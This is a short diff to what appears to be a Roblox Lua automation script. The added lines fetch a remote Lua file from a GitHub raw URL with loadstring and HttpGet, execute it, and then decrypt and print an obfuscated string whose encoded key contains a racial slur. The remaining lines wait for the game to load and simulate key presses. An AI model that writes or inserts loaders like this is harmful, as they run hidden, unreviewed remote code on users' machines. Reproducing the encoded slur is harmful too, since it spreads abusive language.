@@ -1,3 +1,7 @@
+local Decrypt = loadstring(game:HttpGet("https://raw.githubusercontent.com/obiiyeuem/vthangsitink/refs/heads/main/stupiddog.lua"))()
+
+
+print(Decrypt("BananaCat-RHVtYkFzc05pZ2dlcl9u/D94QZ9GI/6ZhVtCkeLjcluA2k3IeQKBAGHRb0yVpoX5Hvo="))
 repeat wait() until game:IsLoaded() and game.Players.LocalPlayer:FindFirstChild("DataLoaded") and game.Players.LocalPlayer.Team ~= nil
 game:service("VirtualInputManager"):SendKeyEvent(true, "Tab", false, game)
 wait(0)
